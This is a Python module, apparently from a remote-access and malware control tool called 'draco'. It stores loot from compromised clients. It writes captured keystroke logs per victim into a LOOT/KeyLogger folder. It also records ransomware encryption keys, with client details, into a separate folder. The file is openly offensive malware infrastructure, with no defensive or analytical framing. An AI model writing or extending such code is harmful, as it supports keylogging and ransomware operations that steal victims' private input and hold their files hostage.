import os
from typing import Union


class KeyStorage:
    def __init__(self, draco: object):
        self.draco = draco
        self.config = self.draco.config
        self.dir_main = os.path.join(self.config.dir_output, "LOOT")
        self.dir_keylogger = os.path.join(self.dir_main, "KeyLogger")
        self.dir_ransomware_key = os.path.join(self.dir_main, "RansmowareKey")
    
    def make_dir(self) -> None:
        if not os.path.exists(self.dir_main):
            os.mkdir(self.dir_main)
        if not os.path.exists(self.dir_keylogger):
            os.mkdir(self.dir_keylogger)
        if not os.path.exists(self.dir_ransomware_key):
            os.mkdir(self.dir_ransomware_key)
    

    def prepare_storage(self, name: str, data: str) -> str:
        self.make_dir()
        fpath = os.path.join(self.dir_keylogger, name)
        if not os.path.exists(fpath):
            with open(fpath, "w") as file:
                file.write(data)
                file.write("\n-------------------------------------------------------------------\n")
        return fpath
    
    def update(self, data: Union[dict, str], handler: object) -> None:
        fpath = os.path.join(self.dir_keylogger, handler.client)
        if not os.path.exists(fpath):
            idata = f"{handler.client}\n"
            for k, i in handler.info.items():
                idata += f"-- {k:<35}{i}\n"
            self.prepare_storage(handler.client, idata)
        try:
            with open(fpath, "a+") as file:
                file.write(data)
        except Exception as e:
            self.draco.msg("no_imp", f"ERROR: save keylog: {e}")
    
    def get_ransomware_key(self, data: str, handler: object) -> None:
        if not os.path.exists(self.dir_ransomware_key):
            self.make_dir()
        fpath = os.path.join(self.dir_ransomware_key, handler.client)
        with open(fpath, "a+") as file:
            file.write("\n\n" + "#" * 100 + "\n")
            file.write(f"CLIENT: {handler.client}\n")
            for k, i in handler.info.items():
                file.write(f"-- {k:<35}{i}\n")
            file.write(f"KEY: {data}")
        self.draco.msg("msg", f"Obtain a ransomware Key: {data}", sender=handler.client)
        
